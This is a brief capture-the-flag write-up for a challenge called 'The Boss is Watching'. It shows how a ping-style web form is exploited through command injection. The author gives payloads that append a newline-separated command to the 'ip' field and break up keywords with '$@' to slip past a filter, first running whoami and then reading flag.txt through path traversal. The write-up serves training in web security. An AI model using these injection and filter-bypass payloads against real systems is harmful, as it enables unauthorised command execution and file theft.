## The Boss is Watching
Task: Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

Again I have the same type of website:

![cb0a433710b24b9994aa5ae5af98af65.png](../images/cb0a433710b24b9994aa5ae5af98af65.png)

If I try the previous payload it does not work.

![c22ce645754645ce98b370ee2e44a591.png](../images/c22ce645754645ce98b370ee2e44a591.png)

The solution here was to play with `$@`
`ip=127.0.0.1%0awho$@ami`

![0250fb0aa29941558c052c210e55bb21.png](../images/0250fb0aa29941558c052c210e55bb21.png)

The final payload is:
`ip=127.0.0.1%0ac$@at<./../../../flag.txt`
![64b3426880e44bf18c5ce1cdc5265221.png](../images/64b3426880e44bf18c5ce1cdc5265221.png)